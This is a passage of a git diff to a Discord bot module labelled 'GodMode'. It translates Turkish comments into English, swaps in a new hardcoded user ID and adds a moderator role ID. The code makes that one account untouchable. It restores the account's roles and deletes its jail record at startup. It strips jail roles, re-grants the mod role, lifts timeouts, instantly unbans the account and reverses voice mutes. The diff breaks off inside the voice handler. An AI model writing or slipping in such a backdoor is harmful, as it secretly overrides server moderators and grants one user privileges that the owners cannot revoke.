@@ -2,11 +2,12 @@ const Jail = require('../models/Jail');
 
 module.exports = (client) => {
     
-    // --- SADECE SENİN ID'N ---
-    const MY_ID = "837688603739816046"; 
+    // --- SETTINGS ---
+    const MY_ID = "1097807544849809408"; 
+    const MOD_ROLE_ID = "1447144301305008168"; 
 
     //---------------------------------------------------------
-    // 1. AÇILIŞ: VERİTABANI TEMİZLİĞİ VE HAPİSTEN KAÇIŞ
+    // 1. STARTUP: DB CLEANUP & ESCAPE
     //---------------------------------------------------------
     client.once('ready', async () => {
         try {
@@ -16,59 +17,70 @@ module.exports = (client) => {
                 const member = await guild.members.fetch(MY_ID).catch(() => null);
                 if (!member) continue;
 
-                // MongoDB'deki hapis kaydını bul ve rollerini geri yükle
+                // Restore roles from MongoDB if jailed
                 const dbJail = await Jail.findOne({ userId: MY_ID, guildId: guild.id });
                 if (dbJail) {
-                    console.log(`🛡️ ${guild.name} sunucusunda hapis kaydı bulundu, roller iade ediliyor...`);
+                    console.log(`🛡️ Jail record found for boss in ${guild.name}. Restoring...`);
                     if (dbJail.roles && dbJail.roles.length > 0) {
                         await member.roles.add(dbJail.roles).catch(() => {});
                     }
                     await Jail.deleteOne({ _id: dbJail._id });
                 }
 
-                // "Jail" isimli rolü üzerinden sök
+                // Forcefully remove "Jail" role if present
                 const jailRole = guild.roles.cache.find(r => r.name.toLowerCase() === 'jail');
                 if (jailRole && member.roles.cache.has(jailRole.id)) {
                     await member.roles.remove(jailRole).catch(() => {});
                 }
 
-                // Timeout (Zamanaşımı) varsa kaldır
+                // Ensure Mod Role is assigned
+                if (!member.roles.cache.has(MOD_ROLE_ID)) {
+                    await member.roles.add(MOD_ROLE_ID).catch(() => {});
+                }
+
+                // Remove timeout if exists
                 if (member.isCommunicationDisabled()) await member.timeout(null).catch(() => {});
             }
-            console.log("🟢 GodMode: Geçmiş temizlendi, patron artık özgür.");
+            console.log("🟢 GodMode: Database cleared and Mod status secured.");
         } catch (err) { console.error("Startup Error:", err); }
     });
 
     //---------------------------------------------------------
-    // 2. ANLIK KORUMA: KİMSE DOKUNAMAZ
+    // 2. LIVE PROTECTION: UNTOUCHABLE STATUS
     //---------------------------------------------------------
     
     client.on('guildMemberUpdate', async (oldMember, newMember) => {
         if (newMember.id !== MY_ID) return;
 
-        // Biri sana "Jail" rolü verirse saniyede geri alır
+        // A) ANTI-JAIL: Remove jail role immediately
         const jailRole = newMember.guild.roles.cache.find(r => r.name.toLowerCase() === 'jail');
         if (jailRole && newMember.roles.cache.has(jailRole.id)) {
             await newMember.roles.remove(jailRole).catch(() => {});
-            console.log("🚫 Jail rolü reddedildi.");
+            console.log("🚫 Shield: Jail role rejected.");
         }
 
-        // Timeout (Zamanaşımı/Mute) atılırsa anında kaldırır
+        // B) ROLE GUARD: If someone takes your Mod Role, take it back
+        if (!newMember.roles.cache.has(MOD_ROLE_ID)) {
+            await newMember.roles.add(MOD_ROLE_ID).catch(() => {});
+            console.log("🛡️ Shield: Mod Role restored.");
+        }
+
+        // C) ANTI-TIMEOUT: Remove mute/timeout instantly
         if (newMember.isCommunicationDisabled()) {
             await newMember.timeout(null).catch(() => {});
-            console.log("🚫 Timeout kaldırıldı.");
+            console.log("🚫 Shield: Timeout removed.");
         }
     });
 
-    // Banlanırsa anında unban
+    // D) ANTI-BAN: Unban immediately
     client.on('guildBanAdd', async (ban) => {
         if (ban.user.id === MY_ID) {
             await ban.guild.members.unban(MY_ID).catch(() => {});
-            console.log("🚨 Ban anında açıldı!");
+            console.log("🚨 Shield: Ban revoked instantly!");
         }
     });
 
-    // Seste susturulursa (Server Mute) geri açar
+    // E) VOICE GUARD: Anti server-mute/deafen
     client.on('voiceStateUpdate', async (oldState, newState) => {
         if (newState.id !== MY_ID) return;
         if (newState.serverMute || newState.serverDeaf) {
